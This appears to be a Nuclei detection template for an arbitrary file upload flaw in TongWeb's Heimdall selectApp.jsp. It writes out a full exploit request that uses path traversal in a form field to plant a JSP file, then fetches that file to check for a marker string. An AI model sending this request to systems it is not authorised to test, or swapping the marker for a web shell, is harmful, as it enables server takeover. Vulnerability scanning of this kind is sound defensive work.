id: tongweb-selectapp-file-upload
info:
  name: TongWeb selectApp.jsp Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    TongWeb’s centralized management tool Heimdall has an arbitrary file upload vulnerability in /pages/cla/selectApp.jsp, allowing attackers to upload malicious files and potentially gain server access.
  tags: file-upload, arbitrary-file-upload
http:
  - raw:
      - |
        POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c

        --fa2ef860e94d564632e291131d20064c
        Content-Disposition: form-data; name="app_fileName"

        ../../applications/heimdall/{{rand_base(6)}}.jsp
        --fa2ef860e94d564632e291131d20064c
        Content-Disposition: form-data; name="app"


        --fa2ef860e94d564632e291131d20064c
        Content-Disposition: form-data; name="className"

        test
        --fa2ef860e94d564632e291131d20064c
        Content-Disposition: form-data; name="uploadApp"; filename="test.jsp"
        Content-Type: application/java-archive

        <% out.println("51135555"); %>
        --fa2ef860e94d564632e291131d20064c--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "HTTP/1.1 200 OK"
        part: header
  - raw:
      - |
        GET /heimdall/{{rand_base(6)}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "51135555"
        part: body
